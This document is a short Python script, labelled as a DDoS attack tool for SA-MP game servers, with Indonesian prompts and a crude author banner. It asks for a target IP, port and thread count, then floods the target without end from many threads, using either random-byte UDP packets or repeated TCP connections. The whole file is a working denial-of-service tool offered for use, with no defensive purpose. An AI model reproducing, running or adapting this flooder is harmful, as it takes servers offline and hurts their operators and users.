#!/usr/bin/env python3
#Code by MR.DANI
import random
import socket
import threading
import sys
import os
from os import system, name

os.system("clear")
print("\033[31m =========================================================================")
print("\033[31m                       TOOLS BY MR.DANI")
print("\033[31m =========================================================================")
print("\033[31m ███╗░░░███╗██████╗░░░░██████╗░░█████╗░███╗░░██╗██╗")
print("\033[31m ████╗░████║██╔══██╗░░░██╔══██╗██╔══██╗████╗░██║██║")
print("\033[31m ██╔████╔██║██████╔╝░░░██║░░██║███████║██╔██╗██║██║")
print("\033[31m ██║╚██╔╝██║██╔══██╗░░░██║░░██║██╔══██║██║╚████║██║")
print("\033[31m ██║░╚═╝░██║██║░░██║██╗██████╔╝██║░░██║██║░╚███║██║")
print("\033[31m ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝")
print("\033[31m DDOS ATTACK FOR SAMP")
print("\033[31m Script Ini Dibuat Hanya Untuk Team Mr.Dani")

ip = str(input(" HOST/IP:"))
port = int(input(" PORT:"))
choice = str(input(" SIAP UNTUK DDOS(y/n):"))
times = int(input(" PACKETS:"))
threads = int(input(" ISI PACKETS:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[Packed]","[Packed]","[Packed]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Tok Tok Tok Packed Dari MR.DANI Otw")
		except:
			print("[!] Error!!! kontol")

def run2():
	data = random._urandom(16)
	i = random.choice(("[Packed]","[Packed]","[Packed]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Tok Tok Tok Packed Dari MR.DANI Otw")
		except:
			s.close()
			print("[*] Error kontol")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
